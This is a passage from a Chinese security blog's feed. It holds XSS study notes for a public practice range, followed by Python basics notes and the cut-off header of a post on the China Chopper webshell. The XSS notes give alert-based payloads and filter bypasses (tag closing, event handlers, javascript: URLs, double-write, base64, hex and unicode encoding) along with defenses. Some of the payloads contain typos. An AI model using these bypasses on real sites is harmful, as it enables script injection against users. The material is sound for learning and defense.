class="code"><pre><span class="line">1.实验环境</span><br><span class="line">https:&#x2F;&#x2F;xss-quiz.init21h.jp&#x2F;</span><br><span class="line">一个日本安全研究员制作的XSS练习靶场。</span><br><span class="line"></span><br><span class="line">2.html中文本标签b介绍</span><br><span class="line">&lt;b&gt;标签规定粗体文本。</span><br><span class="line"></span><br><span class="line">3.对该实验环境探测过程</span><br><span class="line">(1)构造一个不会识别为恶意代码的字符串提交到页面；</span><br><span class="line">(2)使用浏览器审查工具进行代码审查，寻找构造的字符串是否在页面中显示。</span><br><span class="line"></span><br><span class="line">4.闭合文本标签利用XSS</span><br><span class="line">简单payload：</span><br><span class="line">&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">闭合标签payload：</span><br><span class="line">&lt;&#x2F;b&gt;&lt;script&gt;alert(documnet.domain);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="属性中的XSS"><a href="#属性中的XSS" class="headerlink" title="属性中的XSS"></a>属性中的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.配置Google关闭XSS-Auditor</span><br><span class="line">配置chrome --args --disable-xss-auditor</span><br><span class="line"></span><br><span class="line">2.属性中的XSS</span><br><span class="line">ctrl+F搜索特定的字符串</span><br><span class="line"></span><br><span class="line">3.闭合属性引入script</span><br><span class="line">原属性位置：&lt;input value&#x3D;&quot;&quot;&gt;</span><br><span class="line">闭合引号、尖括号，引入script脚本：</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">闭合属性引入事件触发XSS：</span><br><span class="line">&quot; onmouseover&#x3D;alert(document.domain)&gt;</span><br></pre></td></tr></table></figure><h2 id="选择列表中的XSS"><a href="#选择列表中的XSS" class="headerlink" title="选择列表中的XSS"></a>选择列表中的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.HTML select标签介绍</span><br><span class="line">select元素可创建单选或多选菜单。</span><br><span class="line">&lt;select&gt;元素中的&lt;option&gt;标签用于定义列表中的可用选项。</span><br><span class="line"></span><br><span class="line">2.表单</span><br><span class="line">HTML表单用于搜集不同类型的用户输入。</span><br><span class="line"></span><br><span class="line">3.使用Burp进行测试</span><br><span class="line">使用Burpsuite截取HTTP请求，修改提交参数。</span><br><span class="line"></span><br><span class="line">4.闭合触发XSS</span><br><span class="line">&lt;&#x2F;option&gt;&lt;script&gt;alert(documnet.domain)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="选择参数中的XSS"><a href="#选择参数中的XSS" class="headerlink" title="选择参数中的XSS"></a>选择参数中的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.HTML表单隐藏参数</span><br><span class="line">隐藏域是用来收集或发送信息的不可见元素，对于网页访问者来说，隐藏域是看不见的，当表单被提交时，隐藏域就会将信息用设置时定义的名称和值发送到服务器上。</span><br><span class="line"></span><br><span class="line">2.HTML中svg介绍</span><br><span class="line">SVG意为可缩放矢量图形，SVG使用XML格式定义图像。</span><br><span class="line">SVG文件可通过一下标签嵌入HTML文档:&lt;embed&gt;、&lt;object&gt;或&lt;iframe&gt;，也可使用svg标签插入。</span><br><span class="line">&lt;svg&#x2F;事件&#x3D;&quot;&quot;&gt;</span><br><span class="line"></span><br><span class="line">4.闭合触发XSS</span><br><span class="line">paylaod: &quot;&gt;&lt;svg onload&#x3D;alert(document.domain)&gt;%0a</span><br></pre></td></tr></table></figure><h2 id="限制长度的XSS"><a href="#限制长度的XSS" class="headerlink" title="限制长度的XSS"></a>限制长度的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.HTML表单文本框</span><br><span class="line">HTML表单用于搜集不同类型的用户输入。表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等。text定义常规文本输入。</span><br><span class="line"></span><br><span class="line">属性：</span><br><span class="line">value属性规定输入字段的初始值；</span><br><span class="line">readonly属性规定输入字段为只读(不能修改)；</span><br><span class="line">disabled属性规定输入字段是禁用的；</span><br><span class="line">size属性规定输入字段的尺寸(以字符计)；</span><br><span class="line">maxlength属性规定输入字段允许的最大长度，如设置maxlength属性，则输入控件不会接受超过所允许数的字符。</span><br><span class="line"></span><br><span class="line">2.XSS payload长度计算</span><br><span class="line">使用python内置函数len(字符串)计算对应的字节数。</span><br></pre></td></tr></table></figure><h2 id="JavaScript伪协议触发XSS"><a href="#JavaScript伪协议触发XSS" class="headerlink" title="JavaScript伪协议触发XSS"></a>JavaScript伪协议触发XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.javascript伪协议</span><br><span class="line">将javascript代码添加到客户端的方法就是把它放置在伪协议说明符javascript:后的URL中。</span><br><span class="line">这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。</span><br><span class="line">如果javascript：URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</span><br><span class="line">javascript:var new Date();&quot;&lt;h1&gt; The time is:&lt;&#x2F;h1&gt;&quot;+now;</span><br><span class="line"></span><br><span class="line">javascript URL还可以含有只执行动作，但不返回值的javascript语句.</span><br><span class="line">javascript:alert(&quot;hello world&quot;)</span><br><span class="line"></span><br><span class="line">2.a链接标签属性href</span><br><span class="line">&lt;a&gt;标签定义超链接，用于从一个页面链接到另一个页面；</span><br><span class="line">&lt;a&gt;元素最重要的属性是href属性，它指定链接的目标；</span><br><span class="line">在所有的浏览器中，链接的默认外观为：</span><br><span class="line">未被访问的链接带有下划线且是蓝色的；</span><br><span class="line">已被访问的链接带有下划线且是紫色的；</span><br><span class="line">活动链接带有下划线且是红色的。</span><br><span class="line"></span><br><span class="line">3.触发XSS</span><br><span class="line">payload:javascipt:alert(document.domain)</span><br></pre></td></tr></table></figure><h2 id="绕过过滤domain为空的XSS"><a href="#绕过过滤domain为空的XSS" class="headerlink" title="绕过过滤domain为空的XSS"></a>绕过过滤domain为空的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.XSS漏洞发现</span><br><span class="line">构造特殊无害字符串，响应中寻找字符串。</span><br><span class="line">绕过思路：寻找过滤内容</span><br><span class="line">绕过策略：双写绕过、编码绕过</span><br><span class="line"></span><br><span class="line">2.双写绕过</span><br><span class="line">payload:&quot;&gt;&lt;script&gt;alert(document.dodomainmain);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">3.编码绕过</span><br><span class="line">payload:&quot;&gt;&lt;script&gt;eval(atob(&#39;YWXXXXXXXXX&#x3D;&#x3D;&#39;));&lt;&#x2F;script&gt;</span><br><span class="line">atob可将base64编码后的密文转化为明文。</span><br></pre></td></tr></table></figure><h2 id="绕过替换script和on事件的XSS"><a href="#绕过替换script和on事件的XSS" class="headerlink" title="绕过替换script和on事件的XSS"></a>绕过替换script和on事件的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.绕过思路</span><br><span class="line">寻找过滤内容</span><br><span class="line"></span><br><span class="line">2.伪协议绕过</span><br><span class="line">payload:&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(document.domain)&quot;&gt;xss&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">3.空格绕过</span><br><span class="line">paylaod:&quot;&gt;&lt;a href&#x3D;&quot;javascr   ipt:alert(document.domain);&quot;&gt;xss&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h2 id="十六进制绕过触发XSS"><a href="#十六进制绕过触发XSS" class="headerlink" title="十六进制绕过触发XSS"></a>十六进制绕过触发XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.16进制</span><br><span class="line">16进制转换，16进制每一位上可以是从小到大为0，1，2，3，4，5，6，7，8，9，A,B,C,D,E,F 16个大小不同的数，即逢16进1.</span><br><span class="line">其中用A,B,C,D,E,F(不区分大小写)来分别表示10，11，12，13，14，15</span><br><span class="line"></span><br><span class="line">使用python将字符转换为16进制类型：</span><br><span class="line">print(&quot;\\x&quot;+binascii.ba2_hex(s))</span><br><span class="line"></span><br><span class="line">2.双斜杠+十六进制绕过</span><br><span class="line">\\x32 \\x3c</span><br><span class="line"></span><br><span class="line">3.触发XSS</span><br><span class="line">payload:\\x3cscript\\x3ealert(document.domain);\\x3c&#x2F;script\\x3e</span><br></pre></td></tr></table></figure><h2 id="unicode绕过触发XSS"><a href="#unicode绕过触发XSS" class="headerlink" title="unicode绕过触发XSS"></a>unicode绕过触发XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.unicode介绍</span><br><span class="line">Unicode包括字符集和编码方案，Unicode是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。</span><br><span class="line"></span><br><span class="line">使用python将字符转换为unicode类型：</span><br><span class="line">print &quot;\\u00&quot;+binascii.b2a_hex(&quot;&gt;&quot;)</span><br><span class="line"></span><br><span class="line">2.双斜杠+unicode绕过</span><br><span class="line">3.触发XSS</span><br><span class="line">payload:\\u003cscript\\u003ealert(document.domain);\\u003c&#x2F;script\\u003e</span><br></pre></td></tr></table></figure><h2 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.源的含义</span><br><span class="line">源头，信息来源的位置。</span><br><span class="line">在计算机中源是由协议、主机名、端口名组成。</span><br><span class="line">范例：</span><br><span class="line">协议:&#x2F;&#x2F;主机名:端口号&#x2F;</span><br><span class="line"></span><br><span class="line">2.同源策略</span><br><span class="line">在计算机中，同源策略(same-orgin plicy,SOP)用于阻止一个非同源的页面恶意代码去访问另一个非同源页面。</span><br><span class="line">只有两个页面属于同一个源才能互相访问。不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所有a.com下的js脚本读取b.com里面的文件数据会报错。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">源A页面要访问源B页面认证Cookie，如果不加阻止读取cookie，会造成Cookie欺骗绕过登录验证。</span><br><span class="line">注意：同源一定是协议、主机名、端口号完全一致。</span><br><span class="line"></span><br><span class="line">3.IE源的特殊处理</span><br><span class="line">(1)位于可信域trust zones的互信域名间，不受同源策略限制</span><br><span class="line">(2)IE在判断同源时不考虑端口。</span><br><span class="line"></span><br><span class="line">4.document.domain</span><br><span class="line">domain属性可以解决因同源安全策略带来的不同文档的属性共享问题，降域document.domain</span><br><span class="line">同源策略认为域和子域属于不同的域，如：</span><br><span class="line">child.a.com和a.com</span><br><span class="line">child1.a.com合child2.a.com</span><br><span class="line">xxx.child1.a.com合child1.a.com</span><br><span class="line">两两不同源，可以通过设置document.domain&#x3D;&#39;a.com&#39;,浏览器就会认为它们属于同一个源。</span><br><span class="line">想要实现以上任意两个页面之间的通信，两个页面必须都设置document.domain&#x3D;&#39;a.com&#39;</span><br></pre></td></tr></table></figure><h2 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.URL编码</span><br><span class="line">考虑到安全传输问题，防止url字符丢失，并且进一步保证完整性，url引入了转义机制，将不安全的字符编码为安全的字符再进行传输。</span><br><span class="line"></span><br><span class="line">2.html编码</span><br><span class="line">一些保留字符出现在文本节点和标签值里是不安全的。比如&quot;&lt;&gt;&quot;会被浏览器误认为标签，如果想要正确的显示这些字符，需要用到html编码。</span><br><span class="line"></span><br><span class="line">实体编码：一般以&quot;&amp;&quot;开头，&quot;;&quot;结尾，可以不加&quot;;&quot;。</span><br><span class="line">进制编码：以&quot;&amp;#&quot;开头，加上字符的数值，&quot;;&quot;结尾，可以不加&quot;;&quot;。字符的数值可以是任意十进制ascii码或Unicode字符编码。</span><br><span class="line">十六进制的数值需要在编码数字前加&quot;x&quot;。</span><br><span class="line"></span><br><span class="line">3.javascript编码</span><br><span class="line">数字形式：</span><br><span class="line">\u后面加4位16进制数字(或\x后加2位16进制数字)，按字符的unicode数值编码，不足位数以零补充。如&quot;&lt;&quot;转为&quot;\u003c&quot;或&quot;\x3c&quot;。</span><br><span class="line"></span><br><span class="line">4.编码含义</span><br><span class="line">浏览器对提交的编码进行自解析，执行。</span><br></pre></td></tr></table></figure><h2 id="XSS发生的位置"><a href="#XSS发生的位置" class="headerlink" title="XSS发生的位置"></a>XSS发生的位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.GET型URL中的XSS</span><br><span class="line">如果在URL中提交的参数值，在页面中显示，则可能存在XSS。</span><br><span class="line"></span><br><span class="line">2.POST型表单中的XSS</span><br><span class="line">在表单中提交的参数值，在页面中显示，则可能存在XSS。</span><br><span class="line"></span><br><span class="line">3.JSON中的XSS</span><br><span class="line">JSON是一种轻量级的数据交换格式，便于人阅读和编写，同时也易于机器解析和生成，并有效提升网络传输效率。</span><br><span class="line">JSON最常用的格式是对象的键值对。</span><br></pre></td></tr></table></figure><h2 id="自动化XSS挖掘工具-xsser"><a href="#自动化XSS挖掘工具-xsser" class="headerlink" title="自动化XSS挖掘工具-xsser"></a>自动化XSS挖掘工具-xsser</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.XSSer工具介绍</span><br><span class="line">xsser是一款用于针对web应用程序自动化挖掘、利用、报告xss漏洞的框架。</span><br><span class="line"></span><br><span class="line">2.工具原理</span><br><span class="line">官方网站：http:&#x2F;&#x2F;xsser.03c8.net</span><br><span class="line"></span><br><span class="line">3.xsser启动</span><br><span class="line">图形化界面：xsser --gtk</span><br></pre></td></tr></table></figure><h2 id="XSS-Fuzzing工具"><a href="#XSS-Fuzzing工具" class="headerlink" title="XSS Fuzzing工具"></a>XSS Fuzzing工具</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XSSstrike</span><br></pre></td></tr></table></figure><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h4 id="httponly防止盗cookie"><a href="#httponly防止盗cookie" class="headerlink" title="httponly防止盗cookie"></a>httponly防止盗cookie</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.cookie</span><br><span class="line">cookie是某些网站为了辨别用户身份、进行session跟踪，而存储在用户本地终端上的数据（通常经过加密）。</span><br><span class="line">cookie有的是临时的，有的是持续的。临时的cookie只在浏览器上保存一段时间，超过规定时间，cookie就会被系统清除。</span><br><span class="line"></span><br><span class="line">2.cookie作用</span><br><span class="line">cookie是存储在客户端的一小段数据，浏览器通过HTTP协议合服务端进行cookie交互，通常用来存储一些不敏感信息。</span><br><span class="line"></span><br><span class="line">3.清除cookie</span><br><span class="line">通过浏览器工具清除cookie；</span><br><span class="line">通过设置cookie的有效期来清除cookie，删除cookie可能导致某些页面不可用。</span><br><span class="line"></span><br><span class="line">4.cookie httponly</span><br><span class="line">setcookie(&quot;abc&quot;,&quot;test&quot;,NULL,NULL,NULL,NULL,TRUE)，设置secure参数为true后，就不能使用js获取cookie。</span><br></pre></td></tr></table></figure><h4 id="XSS-Filter过滤器"><a href="#XSS-Filter过滤器" class="headerlink" title="XSS Filter过滤器"></a>XSS Filter过滤器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.htmlspecialchars()函数</span><br><span class="line">把预定义的字符转换为HTML实体。</span><br><span class="line">预定义字符：</span><br><span class="line">&amp;和号变成&amp;</span><br><span class="line">&quot;双引号变成&quot;</span><br><span class="line">&#39;单引号变成&#39;</span><br><span class="line">&lt;小于变成&lt;</span><br><span class="line">&gt;大于变成&gt;</span><br><span class="line"></span><br><span class="line">2.htmlentities()函数</span><br><span class="line">对于过滤用户输入的数据非常有用，它会将一些特殊字符转换为HTML实体。</span><br><span class="line">例如用户输入&lt;，就会被该函数转化为HTML实体&lt;(&amp;alt)</span><br><span class="line"></span><br><span class="line">3.strip_tags()函数</span><br><span class="line">该函数会剥去字符串中的HTML、XML以及PHP的标签。</span><br><span class="line">该函数始终会剥离HTML注释，这点无法通过allow参数改变。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>python基础教程</title>
    <link href="http://yoursite.com/2020/07/05/python%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2020/07/05/python基础教程/</id>
    <published>2020-07-05T01:21:08.000Z</published>
    <updated>2020-07-05T03:18:21.655Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="lt-Python基础教程-第3版-gt-读书笔记"><a href="#lt-Python基础教程-第3版-gt-读书笔记" class="headerlink" title="&lt;Python基础教程-第3版&gt;读书笔记"></a>&lt;Python基础教程-第3版&gt;读书笔记</h1><p>本书全本以python3为例</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h4 id="数和表达式"><a href="#数和表达式" class="headerlink" title="数和表达式"></a>数和表达式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">加减：2+2，4-2</span><br><span class="line"></span><br><span class="line">除法：运算结果是小数，即浮点数</span><br><span class="line">1&#x2F;2&#x3D;0.5</span><br><span class="line">1&#x2F;1&#x3D;1.0</span><br><span class="line"></span><br><span class="line">双斜杠：丢弃小数部分，执行整除运算</span><br><span class="line">1&#x2F;&#x2F;2&#x3D;0</span><br><span class="line">1&#x2F;&#x2F;1&#x3D;1</span><br><span class="line">10&#x2F;&#x2F;3&#x3D;3</span><br><span class="line">10&#x2F;&#x2F;-3&#x3D;-4 &#x2F;&#x2F;结果为负数时，圆整后将离0更远，向下圆整到-4</span><br><span class="line"></span><br><span class="line">求余(取模)运算符，x%y结果为x除以y的余数，即执行整除时余下的部分</span><br><span class="line">10&#x2F;&#x2F;3&#x3D;3</span><br><span class="line">10%3&#x3D;1</span><br><span class="line">9%3&#x3D;0</span><br><span class="line">10%-3&#x3D;-2</span><br><span class="line">-10%3&#x3D;2</span><br><span class="line"></span><br><span class="line">乘方求幂运算符</span><br><span class="line">-3**2&#x3D;-9</span><br><span class="line">(-3)**2&#x3D;9</span><br><span class="line">乘方的优先级比求负高，因此-3**2等价于-(3**2)</span><br></pre></td></tr></table></figure><h4 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">十六进制表示：0x</span><br><span class="line"></span><br><span class="line">八进制表示：0o</span><br><span class="line"></span><br><span class="line">二进制表示：0b</span><br></pre></td></tr></table></figure><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>在python中，变量名称只能由字母、数字和下划线构成，且不能以数字开头。</p><p>变量即表示特定值的名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x&#x3D;3表示赋值</span><br><span class="line">使用python变量前必须赋值</span><br></pre></td></tr></table></figure><h4 id="获取用户输入"><a href="#获取用户输入" class="headerlink" title="获取用户输入"></a>获取用户输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input</span><br><span class="line">如x&#x3D;input(&quot;x:&quot;)</span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>python提供了大量的内置函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">乘方 pow</span><br><span class="line">绝对值 abs</span><br></pre></td></tr></table></figure><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p>可将模块视为扩展，导入扩展python功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">导入模块命令：import</span><br><span class="line"></span><br><span class="line">通过使用import的变种from moudle import function，可在调用函数时不指定模块前缀:</span><br><span class="line">from math import sqrt</span><br><span class="line"></span><br><span class="line">nan具有特殊含义，指的是非数值</span><br></pre></td></tr></table></figure><h4 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h4><p>在命令提示符下运行脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xxx.py</span><br></pre></td></tr></table></figure><p>在Linux中运行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">脚本第一行 #! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">要像普通程序一样运行：chmod +x hello.py即可</span><br></pre></td></tr></table></figure><p>注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在python中，#为注释，在代码中，井号后面到行尾的内容都将被忽略。</span><br></pre></td></tr></table></figure><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>单引号、双引号、三引号都可以表示字符串，其中三引号可表示换行的长字符串。</p><p>字符串转义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;可对字符串进行转义，如</span><br><span class="line">&#39;Let\&#39;s go&#39;经过转义，里面的引号不会被认为是字符串结束符，输出为&#39;Let&#39;s go&#39;</span><br></pre></td></tr></table></figure><p>原始字符串</p><p>对于很长的路径，将使用大量的反斜杠。可使用原始字符串，因为原始字符串不会对反斜杠做特殊处理，会让字符串包含的每个字符都保持原样，用前缀 r 表示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(r&#39;C:\nextwhere&#39;)</span><br><span class="line">结果为C:\nextwhere</span><br></pre></td></tr></table></figure><h4 id="字节编码"><a href="#字节编码" class="headerlink" title="字节编码"></a>字节编码</h4><p>Python字符串使用Unicode编码来表示文本，几乎在所有情况下，最好使用UTF-8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello word&quot;.encode(&quot;UTF-8&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>中国菜刀分析及隐藏后门</title>
    <link href="http://yoursite.com/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/"/>
    <id>http://yoursite.com/2020/07/04/中国菜刀分析及隐藏后门/</id>
    <published>2020-07-04T14:26:41.000Z</published>
    <updated>2020-07-04T15:35:33.626Z</updated>
    
